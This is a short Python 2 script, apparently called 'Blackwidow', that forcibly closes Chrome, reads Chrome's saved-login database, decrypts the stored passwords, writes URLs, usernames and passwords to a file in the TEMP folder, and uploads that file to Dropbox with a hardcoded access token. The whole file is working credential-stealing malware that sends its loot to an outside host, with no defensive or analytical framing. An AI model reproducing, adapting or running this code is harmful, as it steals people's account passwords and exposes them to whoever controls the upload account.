import os,sys, sqlite3, win32crypt, argparse, dropbox
from time import sleep

def main():
    os.system('taskkill /F /IM chrome.exe')
    info_list = []
    path = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
    try:
        connection = sqlite3.connect(path + 'Login Data')
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()
        for information in value:
            password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
            if password:
                info_list.append({
                    'origin_url': information[0],
                    'username': information[1],
                    'password': str(password)
                })
    except sqlite3.OperationalError, e:
            sys.exit(0)
    return info_list          
def csv(info):
    fpath = os.path.expanduser(os.getenv('TEMP'))
    fname = os.getenv('COMPUTERNAME')
    with open(fpath+fname, 'wb') as csv_file:
        csv_file.write('origin_url,username,password \n'.encode('utf-8'))
        for data in info:
            csv_file.write(('%s, %s, %s \n' % (data['origin_url'], data['username'], data['password'])).encode('utf-8'))
    db_blackwidow_dumper(fpath, fname)
def db_blackwidow_dumper(dump_path, dump_name):
    client = dropbox.client.DropboxClient('Vh5qeI6BmrAAAAAAAAAAEcbjbw6dlQGeD0LUuqPgrpINeDGuh52qXYfd50WNgyu5')
    f = open(dump_path+dump_name, 'rb')
    client.put_file('/'+dump_name+'.csv', f)
    f.close()
csv(main())
#Blackwidow by SchynWong
#Ref: https://github.com/hassaanaliw/chromepass
